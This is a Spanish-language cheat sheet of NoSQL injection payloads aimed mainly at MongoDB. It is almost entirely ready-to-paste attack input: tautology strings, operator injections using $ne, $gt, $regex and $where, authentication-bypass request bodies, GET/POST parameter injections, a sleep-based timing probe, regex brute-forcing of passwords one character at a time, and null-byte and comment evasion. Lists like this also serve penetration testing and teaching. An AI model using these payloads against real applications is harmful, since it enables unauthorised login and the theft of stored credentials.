
---
# Payloads útiles para NoSQL Injection

A continuación reunimos una lista de payloads que pueden emplearse en diferentes contextos de inyección NoSQL. Es importante recordar que su efectividad depende del motor de base de datos (MongoDB, CouchDB, etc.) y de cómo la aplicación procese las entradas.

---

## Comparaciones básicas

```bash
' || '1'='1
````

```bash
' || 1==1//
```

```bash
' || 1==1%00
```

```bash
' && 'a'=='a
```

```bash
' || true//
```

```bash
' || false || '
```

---

## Operadores MongoDB comunes

```bash
{ "username": { "$ne": null } }
```

```bash
{ "username": { "$gt": "" } }
```

```bash
{ "password": { "$exists": true } }
```

```bash
{ "username": { "$regex": ".*" } }
```

```bash
{ "username": { "$in": ["admin","root","test"] } }
```

---

## Bypass de autenticación

```bash
{ "username": "admin", "password": { "$ne": "xyz" } }
```

```bash
{ "username": { "$eq": "admin" }, "password": { "$regex": ".*" } }
```

```bash
{ "username": { "$gt": "" }, "password": { "$gt": "" } }
```

```bash
{ "username": { "$ne": "guest" }, "password": { "$ne": "guest" } }
```

---

## Uso de `$where`

```bash
{ "$where": "1 == 1" }
```

```bash
{ "$where": "this.username == 'admin'" }
```

```bash
{ "$where": "this.password.length > 0" }
```

```bash
{ "$where": "sleep(5000) || true" }
```

---

## Inyecciones en parámetros GET/POST

```bash
username=admin' || '1'=='1
```

```bash
username=admin' && this.password.match(/.*/)
```

```bash
username[$ne]=anything&password[$ne]=anything
```

```bash
username[$regex]=.*
```

---

## Fuerza bruta de caracteres (ejemplo con `$regex`)

```bash
{ "username": "admin", "password": { "$regex": "^a" } }
```

```bash
{ "username": "admin", "password": { "$regex": "^b" } }
```

```bash
{ "username": "admin", "password": { "$regex": "^.{5}$" } }
```

---

## Payloads con null-byte

```bash
' || 1==1%00
```

```bash
{ "username": { "$ne": null }, "password": { "$ne": null } }%00
```

---

## Comentarios y evasión

```bash
' || 1==1 //
```

```bash
' || 1==1 # 
```

```bash
' || 1==1 -- 
```

---
